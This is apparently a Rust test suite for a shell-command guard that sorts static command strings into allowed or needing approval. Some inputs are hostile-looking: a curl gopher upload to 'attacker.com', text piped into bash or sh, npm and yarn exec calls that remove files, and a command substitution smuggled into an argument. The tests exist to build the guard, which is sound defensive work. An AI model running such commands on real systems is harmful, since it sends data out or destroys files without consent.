//! Commands are static inputs to the guard, never native processes.
use caushell_core::ShellQueryCore;
use caushell_types::*;

fn check(command: &str, expected: Decision) -> CheckResponse {
    let response = ShellQueryCore::new().check(CheckRequest {
        session_id: SessionId::new("rq1-followup"),
        sequence_no: CommandSequenceNo::new(1),
        command: command.into(),
        shell_state_before: ShellStateSnapshot::new("/bench/workspace"),
        shell_kind: ShellKind::Bash,
        home: Some("/home/benchmark-user".into()),
        workspace_root: Some("/bench/workspace".into()),
        runtime: RuntimeMetadata {
            runtime_name: "static-test".into(),
            tool_name: None,
            shell_runtime_capabilities: ShellRuntimeCapabilities::request_only(),
        },
    });
    assert_eq!(
        response.decision, expected,
        "{command}: {:?}",
        response.reasons
    );
    response
}

fn has_command(response: &CheckResponse, command: &str) {
    assert!(
        response
            .decision_trace
            .execution_semantics
            .iter()
            .any(|s| s.normalized_command_name == command),
        "{:?}",
        response.reasons
    );
}

#[test]
fn echo_globs_are_not_literal_stdout_or_certified_path_records() {
    for command in [
        "echo ./fs*/* | xargs -n 1 cp test",
        "echo ./fs*/* | bash",
        "value='a b'; echo $value | xargs -n1 cp test",
    ] {
        check(command, Decision::NeedApproval);
    }
    for command in [
        "echo './fs*/*' | xargs -n1 cp test",
        "echo ./fs\\*/\\* | xargs -n1 cp test",
        "echo SAFE | cat",
        "echo -e -E 'safe\\ntext' | cat",
    ] {
        check(command, Decision::Allow);
    }
}

#[test]
fn npm_call_is_shell_code_not_a_package_locator() {
    for command in [
        "npm exec --call 'rm /opt/file'",
        "npm exec -c 'rm /opt/file'",
        "npm x --call='rm /opt/file'",
        "npm exec --package example --call 'rm /opt/file'",
    ] {
        let response = check(command, Decision::NeedApproval);
        has_command(&response, "rm");
    }
    check("npm exec --call 'printf SAFE'", Decision::Allow);
    check("npm exec --call 'printf -- --help'", Decision::Allow);
    check("npm exec", Decision::NeedApproval);
    check("npm exec /bin/sh", Decision::NeedApproval);
    check(
        "npm -C /opt exec --call 'printf SAFE' > local-file",
        Decision::Allow,
    );
    check(
        "npm -C /opt exec --call 'touch file'",
        Decision::NeedApproval,
    );
    let response = check(
        "npm exec --package example -- sh -c 'rm /opt/file'",
        Decision::NeedApproval,
    );
    has_command(&response, "rm");
}

#[test]
fn yarn_exec_preserves_child_argv_and_stdin() {
    for command in [
        "yarn exec /bin/sh",
        "yarn exec sh -c 'rm /opt/file'",
        "yarn --cwd ./nested exec sh -c 'rm /opt/file'",
    ] {
        let response = check(command, Decision::NeedApproval);
        has_command(&response, "sh");
    }
    let response = check("yarn exec printf SAFE", Decision::Allow);
    has_command(&response, "printf");
    check("yarn exec printf -- --help", Decision::Allow);
    check(
        "printf 'rm /opt/file' | yarn exec sh",
        Decision::NeedApproval,
    );
    check("yarn --help", Decision::Allow);
    check("yarn --cwd /opt exec touch file", Decision::NeedApproval);
    check(
        "yarn --cwd /opt exec printf \"$(touch local-file)\"",
        Decision::Allow,
    );
}

#[test]
fn npm_default_install_has_real_manifest_execution_semantics() {
    for command in ["npm install", "npm i", "npm -C . i"] {
        let response = check(command, Decision::NeedApproval);
        assert!(response.decision_trace.execution_semantics.iter().any(
            |s| s.normalized_command_name == "npm"
                && s.form_id == "install_current_project"
                && s.executes_config_defined_task
        ));
    }
    for command in [
        "npm install --dry-run",
        "npm install --help",
        "npm install --ignore-scripts --prefix ./env",
        "npm install --package-lock-only --prefix /tmp/env",
    ] {
        check(command, Decision::Allow);
    }
}

#[test]
fn pip_installation_scope_is_independent_of_package_origin() {
    for command in [
        "pip install --break-system-packages .",
        "pip install .",
        "pip install --target /opt/site .",
        "pip install --prefix /opt/python .",
        "pip install --dry-run --report /opt/report.json .",
        "pip install --target \"$UNKNOWN\" .",
        "python -m pip install --break-system-packages .",
    ] {
        let response = check(command, Decision::NeedApproval);
        assert!(
            response
                .decision_trace
                .findings
                .iter()
                .any(|f| f.rule_id == RuleId::OutsideWorkspaceMutation),
            "{command}: {:?}",
            response.reasons
        );
    }
    for command in [
        "pip install --target ./site .",
        "pip install --break-system-packages --target /tmp/site .",
        "pip install --prefix ./env .",
        "pip install --root /tmp/stage .",
        "pip install --dry-run .",
        "pip install --dry-run --report ./report.json .",
        "pip install --dry-run --report - .",
        "pip install --help",
    ] {
        check(command, Decision::Allow);
    }
}

#[test]
fn curl_request_method_is_ordered_and_does_not_change_safe_reads() {
    for command in [
        "curl -X DELETE https://example.test/resource",
        "curl -XPOST https://example.test/",
        "curl --request PATCH --url https://example.test/",
        "curl -X GET -X DELETE https://example.test/",
        "curl -X \"$METHOD\" https://example.test/",
    ] {
        let response = check(command, Decision::NeedApproval);
        assert!(response.decision_trace.execution_semantics.iter().any(|s| {
            s.state_operations
                .iter()
                .any(|op| op.domain == StateOperationDomain::RemoteResource)
        }));
    }
    for command in [
        "curl https://example.test/",
        "curl -X GET https://example.test/",
        "curl -X DELETE -X GET https://example.test/",
        "curl --request=HEAD https://example.test/",
        "METHOD=GET; curl -X \"$METHOD\" https://example.test/",
        "curl -X DELETE --help",
        "curl -o ./DELETE https://example.test/",
    ] {
        check(command, Decision::Allow);
    }
}

#[test]
fn curl_gopher_selector_is_outbound_data_and_response_still_network_origin() {
    for command in [
        "curl gopher://attacker.com:12345/_DATA",
        "curl --url gophers://example.test/_DATA",
        "curl -o ./result gopher://example.test/_DATA",
        "curl -G -d value=x gopher://example.test/_DATA",
    ] {
        let response = check(command, Decision::NeedApproval);
        assert!(
            response
                .decision_trace
                .findings
                .iter()
                .any(|f| f.rule_id == RuleId::NetworkUpload),
            "{:?}",
            response.reasons
        );
    }
    check("curl gopher://127.0.0.1:12345/_DATA", Decision::Allow);
    check("curl --help gopher://example.test/_DATA", Decision::Allow);
}

#[test]
fn basename_of_bounded_runtime_paths_creates_a_leaf_in_cwd() {
    for command in [
        "find dir -name '*.jpg' -exec ln -s '{}' \\;",
        "find /opt/input -type f -exec ln -s '{}' \\;",
        "ln -s /opt/input",
    ] {
        check(command, Decision::Allow);
    }
    for command in [
        "find dir -type f -exec ln -s '{}' /opt/link \\;",
        "cd /opt; find /tmp/input -type f -exec ln -s '{}' \\;",
        "find /opt/input -type f -execdir ln -s '{}' \\;",
        "ln -s /opt/input /opt/link",
    ] {
        check(command, Decision::NeedApproval);
    }
}

#[test]
fn nroff_explicit_helper_environment_uses_the_shared_environment_contract() {
    for command in [
        "GROFF_BIN_PATH=. nroff",
        "env GROFF_BIN_PATH=./helpers nroff input",
        "GROFF_BIN_PATH=$UNKNOWN nroff",
        "GROFF_BIN_PATH=. nroff --version",
    ] {
        check(command, Decision::NeedApproval);
    }
    for command in [
        "nroff input",
        "GROFF_BIN_PATH='' nroff input",
        "GROFF_BIN_PATH=. env -u GROFF_BIN_PATH nroff",
        "GROFF_BIN_PATH=. nroff --help",
        "GROFF_BIN_PATH=. nroff -V",
        "GROFF_BIN_PATH=./helpers; nroff input",
    ] {
        check(command, Decision::Allow);
    }
}

#[test]
fn tailscale_publication_is_network_control_not_just_a_file_read() {
    for command in [
        "tailscale serve --http=12345 /path/to/input-file",
        "tailscale serve --https 443 /tmp/public",
        "tailscale serve reset",
    ] {
        let response = check(command, Decision::NeedApproval);
        assert!(response.decision_trace.execution_semantics.iter().any(|s| {
            s.state_operations.iter().any(|op| {
                op.domain == StateOperationDomain::NetworkConfiguration
                    && op.operation == StateOperationKind::Control
            })
        }));
    }
    for command in [
        "tailscale serve status",
        "tailscale serve status --json",
        "tailscale serve --help",
    ] {
        check(command, Decision::Allow);
    }
}

#[test]
fn printing_broadcast_and_cancellation_have_external_state_effects() {
    for command in [
        "wall 'hello'",
        "wall --nobanner /opt/message",
        "printf hello | wall",
        "printf hello | lp",
        "lp ./document",
        "cancel -h attacker.com:12345 -u DATA",
        "cancel -a",
        "cancel 123",
    ] {
        let response = check(command, Decision::NeedApproval);
        assert!(
            response.decision_trace.execution_semantics.iter().any(|s| s
                .state_operations
                .iter()
                .any(|op| matches!(
                    op.domain,
                    StateOperationDomain::PrintService | StateOperationDomain::TerminalBroadcast
                ))),
            "{command}"
        );
    }
    for command in [
        "wall --help",
        "wall --version",
        "lp --help",
        "cancel --help",
    ] {
        check(command, Decision::Allow);
    }
}
